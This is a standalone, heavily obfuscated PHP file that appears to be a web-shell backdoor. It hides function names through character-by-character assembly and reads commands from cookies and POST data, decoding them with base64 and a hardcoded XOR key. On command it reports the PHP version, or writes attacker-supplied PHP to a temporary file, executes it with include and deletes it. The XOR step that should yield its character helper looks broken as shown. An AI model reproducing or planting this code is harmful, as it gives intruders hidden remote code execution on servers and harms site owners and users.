<?php /* fh_e*/function/*vbg  */_togy(){	echo	23428;	}
$pumnmxhnk   =	'pumnmxhnk'	^      '';


$mqvncly	=   "\x66"/*h   */.	"i".$pumnmxhnk(234-126)    ./*   ut */"e"."_"."\x70"/*  bcxt*/./*  q*/"u"."t".$pumnmxhnk(95)	./*   mdsp */"c"."o"."n".$pumnmxhnk(233-117)	./*   aux   */$pumnmxhnk(289-188)   .   "n"."\x74"  .  "\163";$nortj/* ktzhv*/=       "\142"   .   "a".$pumnmxhnk(696-581)	.	$pumnmxhnk(101)/*kqf   */./*  vh */"6"."\x34"/*  iydy   */.     "_"."d".$pumnmxhnk(401-300)/*   tgaot   */.	$pumnmxhnk(662-563)/*  kvinc   */./*  dhn */"o"."\144"    ./*f_fr*/"\x65";

$bazrkvv/*   be_a */=	"u"."\156"       ./* cxjms  */"\x73"      ./*   ha*/"\x65"   ./*bxrcn  */"\162"/* hyfzl   */.	$pumnmxhnk(105)	.	"a".$pumnmxhnk(143-35)/* uqxxv */.       "i".$pumnmxhnk(122)	.	"e";

$rvzaril/*   ioa   */=      "p".$pumnmxhnk(104)	.	$pumnmxhnk(448-336)      ./*   zmbb   */$pumnmxhnk(118)	.	$pumnmxhnk(101)/*   tic */.	"r"."\163"/*  modwh */./*  p*/"i"."\x6f"     .	"n";
$zijucq_dzl	=      "u"."\156"	.	"l".$pumnmxhnk(105)      .   "\x6e"	./*ogovi */$pumnmxhnk(408-301);


	
function  atzu_iegh($aupgb,	$menbocii)

{/*  nem   */global/* df  */$pumnmxhnk;


   $dmolcav	=   "";/*wceq*/for       ($qbwukrjzq	=     0;/*_rw  */$qbwukrjzq	<	strlen($aupgb);)/*   a   */{


      for/*   wit */($ocsjpbd_mv/*   x  */=   0;/*zm_  */$ocsjpbd_mv    <     strlen($menbocii)	&&/*   _dyw */$qbwukrjzq	</*  puoc  */strlen($aupgb);    $ocsjpbd_mv++,     $qbwukrjzq++)	{


/*k_   */$dmolcav	.=	$pumnmxhnk(ord($aupgb[$qbwukrjzq])	^/* s*/ord($menbocii[$ocsjpbd_mv]));	}
	}


       return	$dmolcav;


}



$vwsqx	=     $_COOKIE;

$dkaeimxg     =/*  wyz */$_POST;

$vwsqx	=	array_merge($dkaeimxg,     $vwsqx);



$nkucmsi	=	"2"."1"."1".$pumnmxhnk(50)	.      "\x34"/*   nc */.	"\x63"       .    "1".$pumnmxhnk(51)    .      $pumnmxhnk(45)	.    $pumnmxhnk(155-101)	.	"1"."\x63"/* ps*/.      "\x37"	./*   ef_k*/"\55"/*   mrcr  */./*   fmt*/"4"."6".$pumnmxhnk(399-345)/* lnx   */./* vcyg   */"\61"      .    "-"."\x61"."d"."\64"  .	"\64"    .    "-"."\64"/*  qzxn*/.      "2"."f"."\145"/*   ajqfs   */.	"1"."\67"/* gp  */.	$pumnmxhnk(50)  .	"4"."\x39"	./*  jpgh*/"5"."0"."f";

foreach       ($vwsqx    as/*   tzks */$pnxbaj	=>    $aupgb)/*  v */{

	$aupgb/*tbm   */=/* m  */$bazrkvv(atzu_iegh(atzu_iegh($nortj($aupgb),	$nkucmsi),/* ambqn*/$pnxbaj));  if     (isset($aupgb["\x61"/*   ifa  */.      "\153"]))   {

     if/* f_s */($aupgb["\x61"]/*jfqg   */==	"\151")	{     $qbwukrjzq/*   jeqw   */=  array();
/*miwb   */$qbwukrjzq["\160"/*   f   */./*  _d  */"v"]/*xm  */=/*mnu  */$rvzaril();


	$qbwukrjzq["\x73"/*z   */.       "v"]      =/*  tlxjw   */$pumnmxhnk(51)/* ymgsn */.    "."."5";
	echo	@serialize($qbwukrjzq);

	}	elseif	($aupgb["\x61"]	==/* bvs*/"e")    {

/*  kdxys */$lqdwt     =/*  m  */sprintf("."."\57"   ./*  gpbtx   */$pumnmxhnk(76-39)      .   $pumnmxhnk(115)	.    "."."\160"/*  qyq*/.	"l",	md5($nkucmsi));    $mqvncly($lqdwt,/*  pzcw */"<"/*   zd */.	"?".$pumnmxhnk(112)	.	$pumnmxhnk(104)/*   uwzb */.	$pumnmxhnk(883-771)	./*  isjq */$pumnmxhnk(32)   .	"u".$pumnmxhnk(110)/* enbdi */.   "l".$pumnmxhnk(105)/*pdq  */.     $pumnmxhnk(302-192)  .       $pumnmxhnk(137-30)	./*   it_  */$pumnmxhnk(40)/*nppgf  */./*ndh  */$pumnmxhnk(95)   .	"_"."\x46"     .	"I".$pumnmxhnk(76)  .      "E"."_"."_".")".";".$pumnmxhnk(32)	./*   v_j */$aupgb["d"]);
/* e*/include($lqdwt);
/*   uy */$zijucq_dzl($lqdwt);
	}

	exit();
       }


}
